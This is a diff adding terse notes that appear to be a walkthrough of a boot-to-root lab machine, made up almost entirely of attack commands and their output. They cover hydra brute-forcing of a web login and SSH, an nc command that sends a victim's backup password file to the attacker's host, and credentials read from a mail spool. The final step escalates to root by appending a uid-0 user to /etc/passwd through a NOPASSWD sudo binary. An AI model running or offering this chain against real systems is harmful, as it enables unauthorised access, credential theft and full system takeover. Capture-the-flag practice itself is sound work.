@@ -1,0 +1,35 @@
+
+# index.php appears in Location header
+hydra -t 20 -f -l administrator -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt 10.0.0.80 http-form-post '/login.php:username=^USER^&password=^PASS^:index.php'
+
+hydra -I -f -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt \
+	10.0.0.80 http-form-post '/login.php:username=^USER^&password=^PASS^:S=logged in'
+
+[80][http-post-form] host: 10.0.0.80   login: admin   password: happy
+
+# to get a shell
+sh c.sh
+
+# too long
+hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt ssh://10.0.0.80 -t 8
+
+nc 10.0.0.148 1234 < /home/jim/backups/old-passwords.bak
+nc -lvnp 1234 > pass.txt
+
+hydra -I -l jim -P pass.txt ssh://10.0.0.80 -t 4
+[22][ssh] host: 10.0.0.80   login: jim   password: jibril04
+
+cat /var/spool/mail/jim
+charles:^xHhA&hvim0y
+
+sudo -l
+    (root) NOPASSWD: /usr/bin/teehee
+
+
+# here at kali:
+openssl passwd -crypt -salt xx pozo
+xxg71OIase7TQ
+
+# at victim
+echo "pozo:xxg71OIase7TQ:0:0:pozo:/root:/bin/bash" | sudo /usr/bin/teehee -a /etc/passwd
+su - pozo
